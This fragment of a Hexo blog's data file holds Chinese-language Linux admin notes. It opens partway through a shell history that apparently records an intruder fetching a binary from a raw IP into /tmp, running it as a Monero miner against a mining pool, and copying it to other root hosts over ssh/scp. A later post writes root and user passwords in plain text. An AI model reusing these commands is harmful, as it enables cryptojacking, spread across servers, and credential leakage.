baidu.com<br>  479  ssh <a href=\"mailto:root@60.12.33.88\" target=\"_blank\" rel=\"noopener\">root@60.12.33.88</a><br>  480  lscpu<br>  481  top<br>  482  /usr/bin/wget <a href=\"http://35.194.156.203/gcc\" target=\"_blank\" rel=\"noopener\">http://35.194.156.203/gcc</a> -O /tmp/gcc<br>  483  chmod +x /tmp/gcc<br>  484  /tmp/gcc -o stratum+tcp://pool.usxmrpool.com:3333 -u 43JPCm3BoBSH7X6tiXUGTMT1y8AY2aVMZWojELHhwNyi3QjrMeLzrfHZNxWZpmRhdvdSSHUvUxwLZ6cQFeqUa6R5NEYeifH -p x  &amp;<br>  485  top<br>  486  ping baidu.com<br>  487  ping 3cac.com<br>  488  top<br>  489  /tmp/gcc -o stratum+tcp://pool.usxmrpool.com:2222 -u 43JPCm3BoBSH7X6tiXUGTMT1y8AY2aVMZWojELHhwNyi3QjrMeLzrfHZNxWZpmRhdvdSSHUvUxwLZ6cQFeqUa6R5NEYeifH -p x  &amp;<br>  490  top<br>  491  ssh <a href=\"mailto:root@141.137.149.141\" target=\"_blank\" rel=\"noopener\">root@141.137.149.141</a><br>  492  ssh root<br>  493  ssh <a href=\"mailto:root@139.129.47.28\" target=\"_blank\" rel=\"noopener\">root@139.129.47.28</a><br>  494  ssh <a href=\"mailto:root@25.153.248.225\" target=\"_blank\" rel=\"noopener\">root@25.153.248.225</a><br>  495  ssh <a href=\"mailto:root@121.43.148.191\" target=\"_blank\" rel=\"noopener\">root@121.43.148.191</a> -平2201<br>  496  ssh <a href=\"mailto:root@121.43.148.191\" target=\"_blank\" rel=\"noopener\">root@121.43.148.191</a> -p 2201<br>  497  ssh <a href=\"mailto:root@121.41.175.41\" target=\"_blank\" rel=\"noopener\">root@121.41.175.41</a><br>  498  cd /tmp<br>  499  ls<br>  500  ssp gcc <a href=\"mailto:root@121.41.175.41\" target=\"_blank\" rel=\"noopener\">root@121.41.175.41</a>:/tmp/<br>  501  scp gcc <a href=\"mailto:root@121.41.175.41\" target=\"_blank\" rel=\"noopener\">root@121.41.175.41</a>:/tmp/<br>  502  cd /tmp<br>  503  ssh <a href=\"mailto:root@121.41.175.41\" target=\"_blank\" rel=\"noopener\">root@121.41.175.41</a><br>  504  ssh <a href=\"mailto:root@61.129.87.76\" target=\"_blank\" rel=\"noopener\">root@61.129.87.76</a> -p 2204<br>  505  ssh <a href=\"mailto:root@54.223.83.133\" target=\"_blank\" rel=\"noopener\">root@54.223.83.133</a><br>  506  ssh <a href=\"mailto:root@183.57.72.90\" target=\"_blank\" rel=\"noopener\">root@183.57.72.90</a> -p 2222<br>  507  curl ip.cn<br>  508  ls<br>  509  scp gcc <a href=\"mailto:root@123.206.13.151\" target=\"_blank\" rel=\"noopener\">root@123.206.13.151</a>:/tmp/<br>  510  ssh <a href=\"mailto:root@123.206.13.151\" target=\"_blank\" rel=\"noopener\">root@123.206.13.151</a></p>\n"},{"title":"shell爬虫","date":"2018-07-10T13:09:19.000Z","_content":"```\ncurl -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0' https://www.oschina.net/tweets | grep data-emoji-render | grep -o '\"true\">.*' | sed 's/\"true\">//;s/<\\/span>/\\n/;s/<\\/div>/\\n/'\n","source":"_posts/Linux/shell爬虫.md","raw":"---\ntitle: shell爬虫\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n```\ncurl -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0' https://www.oschina.net/tweets | grep data-emoji-render | grep -o '\"true\">.*' | sed 's/\"true\">//;s/<\\/span>/\\n/;s/<\\/div>/\\n/'\n","slug":"Linux/shell爬虫","published":1,"updated":"2018-07-10T13:10:09.928Z","_id":"cjjedmhad00480gtjhlju8lpu","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code><br>curl -H ‘User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0’ <a href=\"https://www.oschina.net/tweets\" target=\"_blank\" rel=\"noopener\">https://www.oschina.net/tweets</a> | grep data-emoji-render | grep -o ‘“true”&gt;.*’ | sed ‘s/“true”&gt;//;s/&lt;\\/span&gt;/\\n/;s/&lt;\\/div&gt;/\\n/‘</p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>`</code><br>curl -H ‘User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0’ <a href=\"https://www.oschina.net/tweets\" target=\"_blank\" rel=\"noopener\">https://www.oschina.net/tweets</a> | grep data-emoji-render | grep -o ‘“true”&gt;.*’ | sed ‘s/“true”&gt;//;s/&lt;\\/span&gt;/\\n/;s/&lt;\\/div&gt;/\\n/‘</p>\n"},{"title":"shell数字运算","date":"2018-07-10T13:09:19.000Z","_content":"```\necho 'expr 1 + 1'\necho $[1 + 1]\necho \"1+1\" | bc -l\n```","source":"_posts/Linux/shell数字运算.md","raw":"---\ntitle: shell数字运算\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n```\necho 'expr 1 + 1'\necho $[1 + 1]\necho \"1+1\" | bc -l\n```","slug":"Linux/shell数字运算","published":1,"updated":"2018-07-10T13:10:09.927Z","_id":"cjjedmhae004b0gtj88htysm7","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &apos;expr 1 + 1&apos;</span><br><span class=\"line\">echo $[1 + 1]</span><br><span class=\"line\">echo &quot;1+1&quot; | bc -l</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &apos;expr 1 + 1&apos;</span><br><span class=\"line\">echo $[1 + 1]</span><br><span class=\"line\">echo &quot;1+1&quot; | bc -l</span><br></pre></td></tr></table></figure>"},{"title":"tomcat启动成功但是没有监听8080端口","date":"2018-07-10T13:09:19.000Z","_content":"查看tomcat日志\n```\ncd tomcat/logs\ncat catlina.out\n```\n错误如下：\n```\n/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64/jre/bin/java: No such file or directory\n```\n原因：\n\nJava虚拟机没有找到\n\n控制台输入java有输出\n\n直接安装jdk不配置环境变量输入java也会有输出\n\n解决：\n\n按照路径去找发现确实没有文件\n\n重新设置环境变量，配置正确的jre路径，然后重启\n","source":"_posts/Linux/tomcat启动成功但是没有监听8080端口.md","raw":"---\ntitle: tomcat启动成功但是没有监听8080端口\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n查看tomcat日志\n```\ncd tomcat/logs\ncat catlina.out\n```\n错误如下：\n```\n/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64/jre/bin/java: No such file or directory\n```\n原因：\n\nJava虚拟机没有找到\n\n控制台输入java有输出\n\n直接安装jdk不配置环境变量输入java也会有输出\n\n解决：\n\n按照路径去找发现确实没有文件\n\n重新设置环境变量，配置正确的jre路径，然后重启\n","slug":"Linux/tomcat启动成功但是没有监听8080端口","published":1,"updated":"2018-07-10T13:10:09.930Z","_id":"cjjedmhaf004d0gtj44ori0uu","comments":1,"layout":"post","photos":[],"link":"","content":"<p>查看tomcat日志<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd tomcat/logs</span><br><span class=\"line\">cat catlina.out</span><br></pre></td></tr></table></figure></p>\n<p>错误如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64/jre/bin/java: No such file or directory</span><br></pre></td></tr></table></figure></p>\n<p>原因：</p>\n<p>Java虚拟机没有找到</p>\n<p>控制台输入java有输出</p>\n<p>直接安装jdk不配置环境变量输入java也会有输出</p>\n<p>解决：</p>\n<p>按照路径去找发现确实没有文件</p>\n<p>重新设置环境变量，配置正确的jre路径，然后重启</p>\n","site":{"data":{}},"excerpt":"","more":"<p>查看tomcat日志<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd tomcat/logs</span><br><span class=\"line\">cat catlina.out</span><br></pre></td></tr></table></figure></p>\n<p>错误如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64/jre/bin/java: No such file or directory</span><br></pre></td></tr></table></figure></p>\n<p>原因：</p>\n<p>Java虚拟机没有找到</p>\n<p>控制台输入java有输出</p>\n<p>直接安装jdk不配置环境变量输入java也会有输出</p>\n<p>解决：</p>\n<p>按照路径去找发现确实没有文件</p>\n<p>重新设置环境变量，配置正确的jre路径，然后重启</p>\n"},{"title":"yum","date":"2018-07-10T13:09:19.000Z","_content":"指定安装源\n```\nyum install XXX --enablerepo=YYY\nyum install netcat --enablerepo=http://mirrors.aliyun.com/repo/Centos-7.repo\n```\n配置阿里镜像\n```\n1、备份\n\nmv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup\n\n2、下载新的CentOS-Base.repo 到/etc/yum.repos.d/\n\nCentOS 5\n\nwget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo\n\n或者\ncurl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo\n\nCentOS 6\n\nwget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo\n\n或者\ncurl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo\n\nCentOS 7\n\nwget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo\n\n或者\ncurl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo\n\n3、之后运行yum makecache生成缓存\n```","source":"_posts/Linux/yum.md","raw":"---\ntitle: yum\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n指定安装源\n```\nyum install XXX --enablerepo=YYY\nyum install netcat --enablerepo=http://mirrors.aliyun.com/repo/Centos-7.repo\n```\n配置阿里镜像\n```\n1、备份\n\nmv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup\n\n2、下载新的CentOS-Base.repo 到/etc/yum.repos.d/\n\nCentOS 5\n\nwget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo\n\n或者\ncurl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo\n\nCentOS 6\n\nwget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo\n\n或者\ncurl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo\n\nCentOS 7\n\nwget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo\n\n或者\ncurl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo\n\n3、之后运行yum makecache生成缓存\n```","slug":"Linux/yum","published":1,"updated":"2018-07-10T13:10:09.932Z","_id":"cjjedmhah004g0gtjy3pmgrn6","comments":1,"layout":"post","photos":[],"link":"","content":"<p>指定安装源<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install XXX --enablerepo=YYY</span><br><span class=\"line\">yum install netcat --enablerepo=http://mirrors.aliyun.com/repo/Centos-7.repo</span><br></pre></td></tr></table></figure></p>\n<p>配置阿里镜像<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、备份</span><br><span class=\"line\"></span><br><span class=\"line\">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br><span class=\"line\"></span><br><span class=\"line\">2、下载新的CentOS-Base.repo 到/etc/yum.repos.d/</span><br><span class=\"line\"></span><br><span class=\"line\">CentOS 5</span><br><span class=\"line\"></span><br><span class=\"line\">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo</span><br><span class=\"line\"></span><br><span class=\"line\">或者</span><br><span class=\"line\">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo</span><br><span class=\"line\"></span><br><span class=\"line\">CentOS 6</span><br><span class=\"line\"></span><br><span class=\"line\">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class=\"line\"></span><br><span class=\"line\">或者</span><br><span class=\"line\">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class=\"line\"></span><br><span class=\"line\">CentOS 7</span><br><span class=\"line\"></span><br><span class=\"line\">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class=\"line\"></span><br><span class=\"line\">或者</span><br><span class=\"line\">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class=\"line\"></span><br><span class=\"line\">3、之后运行yum makecache生成缓存</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>指定安装源<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install XXX --enablerepo=YYY</span><br><span class=\"line\">yum install netcat --enablerepo=http://mirrors.aliyun.com/repo/Centos-7.repo</span><br></pre></td></tr></table></figure></p>\n<p>配置阿里镜像<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、备份</span><br><span class=\"line\"></span><br><span class=\"line\">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br><span class=\"line\"></span><br><span class=\"line\">2、下载新的CentOS-Base.repo 到/etc/yum.repos.d/</span><br><span class=\"line\"></span><br><span class=\"line\">CentOS 5</span><br><span class=\"line\"></span><br><span class=\"line\">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo</span><br><span class=\"line\"></span><br><span class=\"line\">或者</span><br><span class=\"line\">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo</span><br><span class=\"line\"></span><br><span class=\"line\">CentOS 6</span><br><span class=\"line\"></span><br><span class=\"line\">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class=\"line\"></span><br><span class=\"line\">或者</span><br><span class=\"line\">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class=\"line\"></span><br><span class=\"line\">CentOS 7</span><br><span class=\"line\"></span><br><span class=\"line\">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class=\"line\"></span><br><span class=\"line\">或者</span><br><span class=\"line\">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class=\"line\"></span><br><span class=\"line\">3、之后运行yum makecache生成缓存</span><br></pre></td></tr></table></figure></p>\n"},{"title":"shell脚本","date":"2018-07-10T13:09:19.000Z","_content":"```\n#!/usr/bin/env bash\ncd /root/software/tag\n#删除文件\necho \"开始删除文件\"\nhadoop fs -rm -R input/basic\n\necho \"可运行的程序有: \"\nfor program in Adapter Adpaterfour hello hhaha lallal;\ndo\n    echo \"${program}\"\ndone\n\necho \"输入要运行的程序,默认为Adapter\"\nwhile read var\ndo\nif [ \"$var\" == \"\" ]\nthen\n    nohup hadoop jar tag-0.0.1-jar-with-dependencies.jar com.hs.tag.jobflow.Adapter  --start_date=20170109 --end_date=20170109>adapterlog.log 2>&1 &\n    echo \"开始运行adapter程序，可以看日志了\"\n    break\nelse\n    nohup hadoop jar tag-0.0.1-jar-with-dependencies.jar com.hs.tag.jobflow.${var}  --start_date=20170515 --end_date=20170515>adapterlog.log 2>&1 &\n    echo \"开始运行${var}程序，可以看日志了\"\n    break\nfi\ndone\n\n\n```","source":"_posts/Linux/shell脚本.md","raw":"---\ntitle: shell脚本\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n```\n#!/usr/bin/env bash\ncd /root/software/tag\n#删除文件\necho \"开始删除文件\"\nhadoop fs -rm -R input/basic\n\necho \"可运行的程序有: \"\nfor program in Adapter Adpaterfour hello hhaha lallal;\ndo\n    echo \"${program}\"\ndone\n\necho \"输入要运行的程序,默认为Adapter\"\nwhile read var\ndo\nif [ \"$var\" == \"\" ]\nthen\n    nohup hadoop jar tag-0.0.1-jar-with-dependencies.jar com.hs.tag.jobflow.Adapter  --start_date=20170109 --end_date=20170109>adapterlog.log 2>&1 &\n    echo \"开始运行adapter程序，可以看日志了\"\n    break\nelse\n    nohup hadoop jar tag-0.0.1-jar-with-dependencies.jar com.hs.tag.jobflow.${var}  --start_date=20170515 --end_date=20170515>adapterlog.log 2>&1 &\n    echo \"开始运行${var}程序，可以看日志了\"\n    break\nfi\ndone\n\n\n```","slug":"Linux/shell脚本","published":1,"updated":"2018-07-10T13:10:09.929Z","_id":"cjjedmhah004i0gtjcah4rru4","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env bash</span><br><span class=\"line\">cd /root/software/tag</span><br><span class=\"line\">#删除文件</span><br><span class=\"line\">echo &quot;开始删除文件&quot;</span><br><span class=\"line\">hadoop fs -rm -R input/basic</span><br><span class=\"line\"></span><br><span class=\"line\">echo &quot;可运行的程序有: &quot;</span><br><span class=\"line\">for program in Adapter Adpaterfour hello hhaha lallal;</span><br><span class=\"line\">do</span><br><span class=\"line\">    echo &quot;$&#123;program&#125;&quot;</span><br><span class=\"line\">done</span><br><span class=\"line\"></span><br><span class=\"line\">echo &quot;输入要运行的程序,默认为Adapter&quot;</span><br><span class=\"line\">while read var</span><br><span class=\"line\">do</span><br><span class=\"line\">if [ &quot;$var&quot; == &quot;&quot; ]</span><br><span class=\"line\">then</span><br><span class=\"line\">    nohup hadoop jar tag-0.0.1-jar-with-dependencies.jar com.hs.tag.jobflow.Adapter  --start_date=20170109 --end_date=20170109&gt;adapterlog.log 2&gt;&amp;1 &amp;</span><br><span class=\"line\">    echo &quot;开始运行adapter程序，可以看日志了&quot;</span><br><span class=\"line\">    break</span><br><span class=\"line\">else</span><br><span class=\"line\">    nohup hadoop jar tag-0.0.1-jar-with-dependencies.jar com.hs.tag.jobflow.$&#123;var&#125;  --start_date=20170515 --end_date=20170515&gt;adapterlog.log 2&gt;&amp;1 &amp;</span><br><span class=\"line\">    echo &quot;开始运行$&#123;var&#125;程序，可以看日志了&quot;</span><br><span class=\"line\">    break</span><br><span class=\"line\">fi</span><br><span class=\"line\">done</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env bash</span><br><span class=\"line\">cd /root/software/tag</span><br><span class=\"line\">#删除文件</span><br><span class=\"line\">echo &quot;开始删除文件&quot;</span><br><span class=\"line\">hadoop fs -rm -R input/basic</span><br><span class=\"line\"></span><br><span class=\"line\">echo &quot;可运行的程序有: &quot;</span><br><span class=\"line\">for program in Adapter Adpaterfour hello hhaha lallal;</span><br><span class=\"line\">do</span><br><span class=\"line\">    echo &quot;$&#123;program&#125;&quot;</span><br><span class=\"line\">done</span><br><span class=\"line\"></span><br><span class=\"line\">echo &quot;输入要运行的程序,默认为Adapter&quot;</span><br><span class=\"line\">while read var</span><br><span class=\"line\">do</span><br><span class=\"line\">if [ &quot;$var&quot; == &quot;&quot; ]</span><br><span class=\"line\">then</span><br><span class=\"line\">    nohup hadoop jar tag-0.0.1-jar-with-dependencies.jar com.hs.tag.jobflow.Adapter  --start_date=20170109 --end_date=20170109&gt;adapterlog.log 2&gt;&amp;1 &amp;</span><br><span class=\"line\">    echo &quot;开始运行adapter程序，可以看日志了&quot;</span><br><span class=\"line\">    break</span><br><span class=\"line\">else</span><br><span class=\"line\">    nohup hadoop jar tag-0.0.1-jar-with-dependencies.jar com.hs.tag.jobflow.$&#123;var&#125;  --start_date=20170515 --end_date=20170515&gt;adapterlog.log 2&gt;&amp;1 &amp;</span><br><span class=\"line\">    echo &quot;开始运行$&#123;var&#125;程序，可以看日志了&quot;</span><br><span class=\"line\">    break</span><br><span class=\"line\">fi</span><br><span class=\"line\">done</span><br></pre></td></tr></table></figure>"},{"title":"yum makecache","date":"2018-07-10T13:09:19.000Z","_content":"```\n-rw-r--r--. 1 root root 2573 10月 25 12:54 CentOS-Base.repo\n-rw-r--r--. 1 root root 1612 7月   4 2014 CentOS-Base.repo.backup\n-rw-r--r--. 1 root root  640 7月   4 2014 CentOS-Debuginfo.repo\n-rw-r--r--. 1 root root 1331 7月   4 2014 CentOS-Sources.repo\n-rw-r--r--. 1 root root  156 7月   4 2014 CentOS-Vault.repo\n-rw-r--r--. 1 root root 1209 1月  29 2014 mysql-community.repo.1\n-rw-r--r--. 1 root root 1060 1月  29 2014 mysql-community-source.repo.1\n```\n","source":"_posts/Linux/yum makecache.md","raw":"---\ntitle: yum makecache\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n```\n-rw-r--r--. 1 root root 2573 10月 25 12:54 CentOS-Base.repo\n-rw-r--r--. 1 root root 1612 7月   4 2014 CentOS-Base.repo.backup\n-rw-r--r--. 1 root root  640 7月   4 2014 CentOS-Debuginfo.repo\n-rw-r--r--. 1 root root 1331 7月   4 2014 CentOS-Sources.repo\n-rw-r--r--. 1 root root  156 7月   4 2014 CentOS-Vault.repo\n-rw-r--r--. 1 root root 1209 1月  29 2014 mysql-community.repo.1\n-rw-r--r--. 1 root root 1060 1月  29 2014 mysql-community-source.repo.1\n```\n","slug":"Linux/yum makecache","published":1,"updated":"2018-07-10T13:10:09.931Z","_id":"cjjedmhai004l0gtj6dpwd4eu","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-rw-r--r--. 1 root root 2573 10月 25 12:54 CentOS-Base.repo</span><br><span class=\"line\">-rw-r--r--. 1 root root 1612 7月   4 2014 CentOS-Base.repo.backup</span><br><span class=\"line\">-rw-r--r--. 1 root root  640 7月   4 2014 CentOS-Debuginfo.repo</span><br><span class=\"line\">-rw-r--r--. 1 root root 1331 7月   4 2014 CentOS-Sources.repo</span><br><span class=\"line\">-rw-r--r--. 1 root root  156 7月   4 2014 CentOS-Vault.repo</span><br><span class=\"line\">-rw-r--r--. 1 root root 1209 1月  29 2014 mysql-community.repo.1</span><br><span class=\"line\">-rw-r--r--. 1 root root 1060 1月  29 2014 mysql-community-source.repo.1</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-rw-r--r--. 1 root root 2573 10月 25 12:54 CentOS-Base.repo</span><br><span class=\"line\">-rw-r--r--. 1 root root 1612 7月   4 2014 CentOS-Base.repo.backup</span><br><span class=\"line\">-rw-r--r--. 1 root root  640 7月   4 2014 CentOS-Debuginfo.repo</span><br><span class=\"line\">-rw-r--r--. 1 root root 1331 7月   4 2014 CentOS-Sources.repo</span><br><span class=\"line\">-rw-r--r--. 1 root root  156 7月   4 2014 CentOS-Vault.repo</span><br><span class=\"line\">-rw-r--r--. 1 root root 1209 1月  29 2014 mysql-community.repo.1</span><br><span class=\"line\">-rw-r--r--. 1 root root 1060 1月  29 2014 mysql-community-source.repo.1</span><br></pre></td></tr></table></figure>\n"},{"title":"修改密码，添加用户，配置权限","date":"2018-07-10T13:09:19.000Z","_content":"修改密码\n```\npasswd root\nyou_wanna_fucking_login_motherfucker? \nyou_wanna_fucking_login_motherfucker? \n```\n添加用户\n```\nadduser hello\npasswd hello\nyoumotherfucker\n```\n删除用户\n```\ndeluser hello\n```\n权限分配\n\nroot--组--其他","source":"_posts/Linux/修改密码，添加用户，配置权限.md","raw":"---\ntitle: 修改密码，添加用户，配置权限\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n修改密码\n```\npasswd root\nyou_wanna_fucking_login_motherfucker? \nyou_wanna_fucking_login_motherfucker? \n```\n添加用户\n```\nadduser hello\npasswd hello\nyoumotherfucker\n```\n删除用户\n```\ndeluser hello\n```\n权限分配\n\nroot--组--其他","slug":"Linux/修改密码，添加用户，配置权限","published":1,"updated":"2018-07-10T13:10:09.933Z","_id":"cjjedmhaj004n0gtjq2gikqc1","comments":1,"layout":"post","photos":[],"link":"","content":"<p>修改密码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">passwd root</span><br><span class=\"line\">you_wanna_fucking_login_motherfucker? </span><br><span class=\"line\">you_wanna_fucking_login_motherfucker?</span><br></pre></td></tr></table></figure></p>\n<p>添加用户<br><figure class=\"highlight 